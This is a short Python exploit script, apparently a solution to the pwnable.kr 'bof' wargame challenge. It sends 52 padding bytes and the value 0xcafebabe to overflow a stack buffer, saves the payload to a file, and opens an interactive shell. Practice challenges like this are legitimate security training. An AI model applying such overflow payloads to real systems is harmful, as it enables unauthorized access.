from zio import *
import struct
target = ("./bof")
target = ('pwnable.kr', 9000)
io = zio(target, timeout = 0x9999)

#io.read_until("overflow me : ")
key = 0xcafebabe
io.write('a' *52 + struct.pack("I", key) + "\n")
input_file = open("data.txt", 'w')
input_file.write('a' *52 + struct.pack("I", key) + "\n")
input_file.close()
io.interact()